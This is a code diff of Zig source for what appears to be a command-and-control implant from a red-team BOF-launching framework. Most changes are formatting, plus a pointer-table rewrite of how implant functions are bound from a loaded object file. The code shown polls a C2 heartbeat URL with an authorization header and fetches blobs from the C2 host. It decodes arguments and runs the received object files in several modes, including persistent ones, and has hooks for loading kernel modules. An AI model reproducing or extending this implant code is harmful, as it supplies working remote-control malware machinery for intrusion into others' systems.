@@ -15,26 +15,28 @@ const debug_proxy_host = "127.0.0.1";
 const debug_proxy_port = 8080;
 
 const ImplantActions = struct {
-  const Self = @This();
+    const Self = @This();
 
-  kmodLoader: ?*const fn (mod_name: [*:0]const u8) callconv(.C) c_int = null,
+    kmodLoader: ?*const fn (mod_name: [*:0]const u8) callconv(.C) c_int = null,
 
-  pub fn attachFunctionality(self: *Self, bofObj: bof.Object) void {
+    pub fn attachFunctionality(self: *Self, bofObj: bof.Object) void {
+        const fields = @typeInfo(Self).Struct.fields;
 
-      std.log.info("Implant's functionality:\n", .{});
-      const fields = @typeInfo(Self).Struct.fields;
-      inline for (fields) |field| {
-         std.debug.print("{s}\n", .{field.name});
-      }
+        var ptr_table: [fields.len]usize = undefined;
 
-      self.kmodLoader = @ptrCast(@alignCast(bofObj.getProcAddress("kmodLoader")));
-  }
+        inline for (fields, 0..) |_, i| {
+            ptr_table[i] = @intFromPtr(self) + i * @sizeOf(usize);
+        }
+
+        inline for (fields, 0..) |field, i| {
+            @as(*usize, @ptrFromInt(ptr_table[i])).* = @intFromPtr(bofObj.getProcAddress(field.name));
+        }
+    }
 };
 
 var implant_actions: ImplantActions = .{};
 
 fn fetchBlob(allocator: std.mem.Allocator, state: *State, blob_uri: []const u8) ![]const u8 {
-
     const uri = try std.fmt.allocPrint(allocator, "http://{s}{s}", .{ c2_host, blob_uri });
     defer allocator.free(uri);
 
@@ -211,8 +213,7 @@ fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *State, root: std.js
     while (iter.next()) |arg| {
         std.log.info("Adding arg: {s}", .{arg});
 
-        if(args_spec[i] == 'b') {
-
+        if (args_spec[i] == 'b') {
             const buf = if (root.object.get(arg)) |value| buf: {
                 const len = try state.base64_decoder.calcSizeForSlice(value.string);
                 const buf = try allocator.alloc(u8, len);
@@ -221,8 +222,8 @@ fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *State, root: std.js
                 break :buf buf;
             } else null;
             defer if (buf) |b| allocator.free(b);
- 
-            std.log.info("buf: {s} {s}", .{arg, buf.?});
+
+            std.log.info("buf: {s} {s}", .{ arg, buf.? });
 
             const trimmed_buf = std.mem.trimRight(u8, buf.?, "\n");
 
@@ -231,7 +232,6 @@ fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *State, root: std.js
 
             try bof_args.add(buf_len);
             try bof_args.add(std.mem.asBytes(&trimmed_buf.ptr));
-
         } else {
             try bof_args.add(arg);
         }
@@ -244,7 +244,6 @@ fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *State, root: std.js
         std.log.info("Execution mode: {s}-based", .{exec_mode});
 
         bof_context = try bof_to_exec.run(bof_args.getBuffer());
-
     } else if (std.mem.eql(u8, exec_mode, "thread")) {
         std.log.info("Execution mode: {s}-based", .{exec_mode});
 
@@ -276,10 +275,10 @@ fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *State, root: std.js
         try state.persistent_bofs.put(hash, bof_to_exec);
 
         // BOF contains go(...) function, so execute it
-        if(bof_to_exec.getProcAddress("go") != null) {
+        if (bof_to_exec.getProcAddress("go") != null) {
             bof_context = try bof_to_exec.run(bof_args.getBuffer());
         } else {
-        // return here, as we do not create bof.Context so we don't want to append it to state.pending_bofs list
+            // return here, as we do not create bof.Context so we don't want to append it to state.pending_bofs list
             return;
         }
     }
@@ -298,9 +297,7 @@ fn processCommands(allocator: std.mem.Allocator, state: *State) !void {
     var server_header_buffer: [1024]u8 = undefined;
     var req = try state.http_client.open(.GET, state.heartbeat_uri, .{
         .server_header_buffer = &server_header_buffer,
-        .extra_headers = &.{
-            .{ .name = "authorization", .value = state.heartbeat_authz }
-        },
+        .extra_headers = &.{.{ .name = "authorization", .value = state.heartbeat_authz }},
     });
     defer req.deinit();
 
@@ -358,9 +355,9 @@ fn processCommands(allocator: std.mem.Allocator, state: *State) !void {
                     .launcher_error_code = @abs(@intFromError(err)) - 1000,
                 });
             };
-        // tasked for kernel module loading?
+            // tasked for kernel module loading?
         } else if (std.mem.eql(u8, cmd_prefix, "kmod")) {
-            if(implant_actions.kmodLoader == null) {
+            if (implant_actions.kmodLoader == null) {
                 std.log.info("Kernel module loading not implemented", .{});
                 return error.BadData;
             }
@@ -368,9 +365,9 @@ fn processCommands(allocator: std.mem.Allocator, state: *State) !void {
             std.log.info("Loading kernel module: {s}", .{cmd_name});
             _ = implant_actions.kmodLoader.?("mzet kmod loader here");
 
-        // tasked for custom command execution?
+            // tasked for custom command execution?
         } else if (std.mem.eql(u8, cmd_prefix, "cmd")) {
-            std.log.info("Executing builtin command: {s}", .{cmd_name}); 
+            std.log.info("Executing builtin command: {s}", .{cmd_name});
 
             // tasked to execute cmd:release_persistent_bofs
             if (std.mem.eql(u8, cmd_name, "release_persistent_bofs")) {
